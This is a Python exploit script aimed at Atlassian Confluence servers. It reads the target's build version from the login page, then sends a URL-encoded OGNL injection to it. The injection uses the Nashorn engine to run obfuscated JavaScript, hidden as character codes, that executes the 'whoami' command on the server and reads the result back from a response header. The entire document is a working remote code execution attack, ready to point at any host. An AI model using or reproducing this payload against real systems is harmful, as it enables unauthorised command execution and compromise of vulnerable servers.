import requests
import re
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

def check_target_version(host):

  response = requests.get("{}/login.action".format(host), verify=False)
  if response.status_code == 200:
    filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
    if(len(filter_version) >= 1):
      version = filter_version[0].split("'>")[1].split('</')[0]
      return version
    else:
      return False
  else:
    return host


def send_payload(host):
    
    response = requests.get("{}/%24%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22%2Cnull).invoke(null%2Cnull).setHeader(%22X-CMD%22%2CClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22eval(String.fromCharCode(118%2C97%2C114%2C32%2C115%2C61%2C39%2C39%2C59%2C118%2C97%2C114%2C32%2C112%2C112%2C32%2C61%2C32%2C106%2C97%2C118%2C97%2C46%2C108%2C97%2C110%2C103%2C46%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C103%2C101%2C116%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C40%2C41%2C46%2C101%2C120%2C101%2C99%2C40%2C39%2C119%2C104%2C111%2C97%2C109%2C105%2C39%2C41%2C46%2C103%2C101%2C116%2C73%2C110%2C112%2C117%2C116%2C83%2C116%2C114%2C101%2C97%2C109%2C40%2C41%2C59%2C119%2C104%2C105%2C108%2C101%2C32%2C40%2C49%2C41%2C32%2C123%2C118%2C97%2C114%2C32%2C98%2C32%2C61%2C32%2C112%2C112%2C46%2C114%2C101%2C97%2C100%2C40%2C41%2C59%2C105%2C102%2C32%2C40%2C98%2C32%2C61%2C61%2C32%2C45%2C49%2C41%2C32%2C123%2C98%2C114%2C101%2C97%2C107%2C59%2C125%2C115%2C61%2C115%2C43%2C83%2C116%2C114%2C105%2C110%2C103%2C46%2C102%2C114%2C111%2C109%2C67%2C104%2C97%2C114%2C67%2C111%2C100%2C101%2C40%2C98%2C41%2C125%2C59%2C115))%22))%7D/".format(host), verify=False, allow_redirects=False)
    
    if(response.status_code == 302):
        return response.headers['X-Cmd']
    else:
        return False

if __name__=="__main__":
    target = sys.argv[1]
    version = check_target_version(target)
    if version :
        print("Confluence target version: {}".format(version))
    else:
        print("Can't find the used version for this target")
  
    exec_payload = send_payload(target) 
    print(exec_payload)
